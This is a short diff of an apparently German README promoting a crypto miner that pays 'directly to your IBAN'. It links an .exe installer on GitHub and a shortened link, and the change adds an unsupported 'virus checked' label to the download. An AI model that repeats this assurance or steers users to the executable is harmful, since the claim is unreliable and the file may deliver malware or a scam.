@@ -2,13 +2,12 @@
 
 Start Crypto mining direkt zu deine IBAN
 
-Tools/Infos f. Crypto miner
 
 shorten: https://git.io/JnPte
 
 
-### Download Istaller
-https://github.com/FriNagy/meiner/blob/main/files/nanom_inst.exe
+### Download Installer (Viren geprüft)
+[nanomine Installer.exe]https://github.com/FriNagy/meiner/blob/main/files/nanom_inst.exe
 
 
 siehe auch:
